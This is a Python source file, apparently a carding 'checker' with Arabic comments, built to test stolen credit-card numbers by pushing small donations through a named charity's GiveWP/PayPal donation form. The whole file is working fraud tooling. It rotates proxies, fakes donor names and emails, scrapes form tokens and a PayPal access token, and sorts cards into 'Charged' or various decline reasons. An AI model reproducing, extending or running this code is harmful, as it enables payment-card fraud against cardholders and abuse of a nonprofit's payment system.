# ==================== gatet.py (PayPal - Updated with jo3.py requests + Proxies) ====================

import os, sys
import random
import requests, time, string, base64, re, json, threading, uuid
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== تحميل البروكسيات من ملف ====================
PROXIES_LIST = []

def load_proxies():
    global PROXIES_LIST
    PROXIES_LIST = []
    try:
        with open('proxies.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) == 4:
                        ip, port, username, password = parts
                        proxy_url = f'http://{username}:{password}@{ip}:{port}'
                        PROXIES_LIST.append({'http': proxy_url, 'https': proxy_url})
                    elif len(parts) == 2:
                        ip, port = parts
                        proxy_url = f'http://{ip}:{port}'
                        PROXIES_LIST.append({'http': proxy_url, 'https': proxy_url})
        print(f"[+] Loaded {len(PROXIES_LIST)} proxies from proxies.txt")
    except FileNotFoundError:
        print("[!] proxies.txt not found, running without proxies")
    except Exception as e:
        print(f"[!] Error loading proxies: {e}")

load_proxies()

def get_random_proxy():
    if PROXIES_LIST:
        return random.choice(PROXIES_LIST)
    return None

# ================ إعدادات الديناميكية ================
def get_random_user_agent():
    return generate_user_agent()

def generate_random_email(domain=None):
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com', 'aol.com', 'protonmail.com']
    if not domain:
        domain = random.choice(domains)
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
    number = random.randint(10, 9999)
    return f"{name}{number}@{domain}"

def generate_random_name():
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    return random.choice(first_names), random.choice(last_names)

def generate_fake_data():
    first, last = generate_random_name()
    email = generate_random_email()
    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}

# ================ دالة الفحص (ريكويستات محدثة من jo3.py - موقع themiqlatproject.org) ================
def pay(ccx):
    try:
        number, month, year, cvc = [x.strip() for x in ccx.split("|")]
        month = month.zfill(2)
        if "20" in year:
            year = year.split("20")[1]
        else:
            year = year[-2:] if len(year) > 2 else year
    except: 
        return "INVALID"

    fake = generate_fake_data()
    s = requests.Session()
    
    # إضافة بروكسي إذا وجد
    proxy = get_random_proxy()
    if proxy:
        s.proxies = proxy
    s.verify = False
    
    user = get_random_user_agent()
    
    try:
        # بيانات الموقع (من jo3.py)
        url = 'https://themiqlatproject.org/donations/the-miqlat-project-2/'
        url_iframe = 'https://themiqlatproject.org/give/the-miqlat-project-2'
        url_ajax = 'https://themiqlatproject.org/wp-admin/admin-ajax.php'
        
        # Cookies ثابتة (من jo3.py)
        cookies = {
            '_I_': '17c6be3bd20fdaa44a5768e5ce2885a75c00a9dea07237c7833a1fbbdcf7ffc6-1777747338',
        }
        
        # 1. جلب الصفحة الرئيسية (headers من jo3.py)
        headers = {
            'authority': 'themiqlatproject.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://themiqlatproject.org/.well-known/sgcaptcha/?r=%2Fdonations%2Fthe-miqlat-project-2%2F&sol=MjE6MTc3Nzc0NzMzMzo1YjBjYmZmYToyNzYwODE4ZmIxZjZjYjVhODY2MzQ4MGZlN2YxN2ViNTMxYTYyYmI0MWYzOGI3MDE0NDM3YzQ1MTc0MDM3OWRjOgFGBQI%3D&s=4919:332721',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        r = s.get(url, cookies=cookies, headers=headers)
        
        # 2. جلب صفحة iframe (headers من jo3.py)
        headers = {
            'authority': 'themiqlatproject.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://themiqlatproject.org/donations/the-miqlat-project-2/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        params = {'giveDonationFormInIframe': '1'}
        r = s.get(url_iframe, params=params, cookies=cookies, headers=headers)
        html = r.text
        
        # 3. استخراج البيانات
        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', html).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', html).group(1)
        kol = base64.b64decode(enc_token).decode('utf-8')
        access_token = re.findall(r'"accessToken":"(.*?)"', kol)[0]
        
        # 4. Create Order (data من jo3.py)
        params = {'action': 'give_paypal_commerce_create_order'}
        headers = {
            'authority': 'themiqlatproject.org',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'origin': 'https://themiqlatproject.org',
            'referer': 'https://themiqlatproject.org/give/the-miqlat-project-2?giveDonationFormInIframe=1',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
        }
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'The Miqlat Project',
            'give-current-url': url,
            'give-form-url': 'https://themiqlatproject.org/give/the-miqlat-project-2/',
            'give-form-hash': form_hash,
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            'give_recurring_donation_details': '{"is_recurring":false}',
            'give-amount': '0.50',
            'give-selected-fund': '2',
            'give_first': fake['first_name'],
            'give_last': fake['last_name'],
            'give_company_option': 'no',
            'give_company_name': '',
            'give_email': fake['email'],
            'give_comment': '',
            'payment-mode': 'paypal-commerce',
            'card_name': fake['card_name'],
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
            'give_embed_form': '1',
        }
        
        r = s.post(url_ajax, params=params, cookies=cookies, headers=headers, data=data)
        order_id = r.json()['data']['id']
        
        # 5. Confirm with PayPal (headers من jo3.py)
        headers_paypal = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {access_token}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '2a7b2ffcd2d1e70569231cd641c9970d',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': number,
                    'expiry': f'20{year}-{month}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', 
               headers=headers_paypal, json=json_data)
        
        # 6. Approve Order (data من jo3.py)
        params = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
        headers = {
            'authority': 'themiqlatproject.org',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'origin': 'https://themiqlatproject.org',
            'referer': 'https://themiqlatproject.org/give/the-miqlat-project-2?giveDonationFormInIframe=1',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
        }
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'The Miqlat Project',
            'give-current-url': url,
            'give-form-url': 'https://themiqlatproject.org/give/the-miqlat-project-2/',
            'give-form-hash': form_hash,
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            'give_recurring_donation_details': '{"is_recurring":false}',
            'give-amount': '0.50',
            'give-selected-fund': '2',
            'give_first': fake['first_name'],
            'give_last': fake['last_name'],
            'give_company_option': 'no',
            'give_company_name': '',
            'give_email': fake['email'],
            'give_comment': '',
            'payment-mode': 'paypal-commerce',
            'card_name': fake['card_name'],
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
            'give_embed_form': '1',
        }
        
        r = s.post(url_ajax, params=params, cookies=cookies, headers=headers, data=data)
        txt = r.text.upper()
        
        # ================ الردود الأصلية من gatet.py (زي ما هي من غير تعديل) ================
        if 'DO_NOT_HONOR' in txt: 
            return 'Declined | Do not honor'
        elif 'ACCOUNT_CLOSED' in txt: 
            return 'Declined | Account closed'
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in txt: 
            return 'Declined | Account closed'
        elif 'LOST_OR_STOLEN' in txt: 
            return 'Declined | LOST OR STOLEN'
        elif 'CVV2_FAILURE' in txt: 
            return 'Declined | Card Issuer Declined CVV'
        elif 'SUSPECTED_FRAUD' in txt: 
            return 'Declined | SUSPECTED FRAUD'
        elif 'INVALID_ACCOUNT' in txt: 
            return 'Declined | INVALID_ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in txt: 
            return 'Declined | REATTEMPT NOT PERMITTED'
        elif 'ACCOUNT BLOCKED BY ISSUER' in txt: 
            return 'Declined | ACCOUNT_BLOCKED_BY_ISSUER'
        elif 'ORDER_NOT_APPROVED' in txt: 
            return 'Declined | ORDER_NOT_APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in txt: 
            return 'Declined | PICKUP_CARD_SPECIAL_CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in txt: 
            return 'Declined | PAYER CANNOT PAY'
        elif 'INSUFFICIENT_FUNDS' in txt: 
            return 'Declined | Insufficient Funds'
        elif 'GENERIC_DECLINE' in txt: 
            return 'Declined | GENERIC_DECLINE'
        elif 'COMPLIANCE_VIOLATION' in txt: 
            return 'Declined | COMPLIANCE VIOLATION'
        elif 'TRANSACTION_NOT PERMITTED' in txt: 
            return 'Declined | TRANSACTION NOT PERMITTED'
        elif 'PAYMENT_DENIED' in txt: 
            return 'Declined | PAYMENT_DENIED'
        elif 'INVALID_TRANSACTION' in txt: 
            return 'Declined | INVALID TRANSACTION'
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in txt: 
            return 'Declined | RESTRICTED OR INACTIVE ACCOUNT'
        elif 'SECURITY_VIOLATION' in txt: 
            return 'Declined | SECURITY_VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in txt: 
            return 'Declined | DECLINED DUE TO UPDATED ACCOUNT'
        elif 'INVALID_OR_RESTRICTED_CARD' in txt: 
            return 'Declined | INVALID CARD'
        elif 'EXPIRED_CARD' in txt: 
            return 'Declined | EXPIRED CARD'
        elif 'CRYPTOGRAPHIC_FAILURE' in txt: 
            return 'Declined | CRYPTOGRAPHIC FAILURE'
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in txt: 
            return 'Declined | TRANSACTION CANNOT BE COMPLETED'
        elif 'DECLINED_PLEASE_RETRY' in txt: 
            return 'Declined | DECLINED PLEASE RETRY LATER'
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in txt: 
            return 'Declined | EXCEED LIMIT'
        elif '"STATUS":"COMPLETED"' in txt and '"RESPONSE_CODE":"0000"' in txt:
            return 'Charged !'
        elif 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
            return 'Charged !'
        else:
            try:
                return f"Response | {json.loads(txt)['data']['error']}"
            except:
                return f'Response | {txt[:300]}'
            
    except Exception as e:
        return "ERROR"

# دالة الفحص النهائية
def look(cc_line):
    return pay(cc_line)
